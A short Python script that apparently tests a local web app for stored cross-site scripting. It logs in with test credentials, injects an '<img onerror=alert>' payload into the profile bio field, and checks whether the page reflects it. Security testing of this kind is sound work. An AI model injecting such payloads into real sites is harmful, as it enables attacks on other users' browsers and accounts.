#!/usr/bin/env python3

import requests

url_login = "http://127.0.0.1:5000/login"
url_profile = "http://127.0.0.1:5000/profile"

credentials = {
    "email": "test_secure@mail.com",
    "password": "SecurePass123"
}

session = requests.Session()
response = session.post(url_login, data=credentials)

print("Login response:", response.text)
if "Logat ca:" not in response.text:
    print("Login failed.")
    exit(1)

xss_payload = '<img src=x onerror="alert(\'XSS Vulnerability\')">'

bio_data = {"bio": xss_payload}
response = session.post(url_profile, data=bio_data)

if "Bio actualizat" in response.text:
    print("XSS payload injected successfully")
    
    response = session.get(url_profile)
    if xss_payload in response.text:
        print("XSS payload stored in database and reflected in HTML")
    else:
        print("Payload submitted but not reflected")
else:
    print("Failed to update bio")
